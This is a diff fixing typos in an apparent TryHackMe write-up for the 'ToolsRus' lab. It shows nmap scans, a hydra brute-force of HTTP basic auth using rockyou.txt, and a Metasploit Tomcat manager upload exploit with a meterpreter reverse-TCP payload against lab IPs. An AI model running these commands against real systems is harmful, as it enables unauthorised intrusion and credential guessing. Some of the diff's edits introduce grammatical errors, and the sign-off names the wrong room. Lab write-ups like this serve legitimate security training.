@@ -1,7 +1,7 @@
 # ToolsRus
 > 4lch3my | March 09, 2023
 -------------------
-#### Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit
+#### Practice using tools such as dirbuster, hydra, nmap, nikto and metasploit
 #### [Room Link](https://tryhackme.com/room/toolsrus)
 
 ## Tasks
@@ -9,10 +9,10 @@
   Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
 <br>
 
-To start, I use [nmap] which is default option on the perosnal Kali install I have. We start with a basic command `nmap -sC -sV -A MACHINE_IP`.
+To start, I use [nmap] which is default option on the personal Kali install I have. We start with a basic command `nmap -sC -sV -A MACHINE_IP`.
 <br>
 
-The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in agressive mode, so we can follow along with the commands and enumeration.
+The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in aggressive mode, so we can follow along with the commands and enumeration.
 In our NMAP results we get:
 
 ```
@@ -96,7 +96,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2023/03/09 01:00:46 Finished
 ===============================================================
 ```
-Time to visit all the directorys. Let's go!
+Time to visit all the directory's. Let's go!
 <br>
 
 Fist the main page: `http://MACHINE_IP/`. Empty!
@@ -110,7 +110,7 @@ Next will be: `http://MACHINE_IP/guidelines/`. And we found our username!
 And finally: `http://MACHINE_IP/protected`. We get stopped by an authentication popup asking for a username:password combination. Time for some good old bruteforcing with `hydra`.
 <br>
 
-We already know our user, `bob`, `MACHINE_IP`, and `/protected/` directory so we can start a `http-get` attack against our machine with the wordlist of our choise. As this is a `THM machine`, we suspect that the password will be located within the usual `rockyou.txt` file. To to run the attack: `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.241.174 http-get /protected/`.
+We already know our user, `bob`, `MACHINE_IP`, and `/protected/` directory so we can start a `http-get` attack against our machine with the wordlist of our choise. As this is a `THM machine`, we suspect that the password will be located within the usual `rockyou.txt` file. To run the attack: `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.241.174 http-get /protected/`.
 
 ```
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -131,7 +131,7 @@ And that's the end of that page. Moving on to the `http://MACHINE_IP:1234/`, whe
 
 ![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUs/images/Tomcat.PNG?raw=true)
 
-After a quick `Google` or `ChatGPT` seearch we can see that this app is quite old and has multiple `CVE's` dedicated to it. Seems like the website admin did not update this for a long time. Making our lifes easier I see... Moving on to actually getting on to this machine and grabing the final flag. As instructed by the box, we will use `Metasploit` to answer the last two questions. 
+After a quick `Google` or `ChatGPT` search we can see that this app is quite old and has multiple `CVE's` dedicated to it. Seems like the website admin did not update this for a long time. Making our life's easier I see... Moving on to actually getting on to this machine and grabbing the final flag. As instructed by the box, we will use `Metasploit` to answer the last two questions. 
 <br>
 
 After switching to the `Metasploit Console` with the command `mfconsole`, we can search for Tomcat vulnerabilities in the databased stored in the app: `msf6 > search Tomcat`
@@ -158,7 +158,7 @@ Matching Modules
 The 6th `exploit` on the list `/multi/http/tomcat_mgr_deploy` seems to be exactly what we need. Let's switch to it and configure it:
 
 ```
-msf6 > use exploit/multi/http/tomcat_mgr_uplo
+msf6 > use exploit/multi/http/tomcat_mgr_upload
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
 msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.241.174
 RHOSTS => 10.10.241.174
@@ -190,4 +190,4 @@ Success we have access! We can now grab the flag and complete this room!
 
 ![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20ToolsRUs/images/flag.PNG?raw=true)
 
-#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3myí
+#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeup's of mine or interested in some of my coding work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my
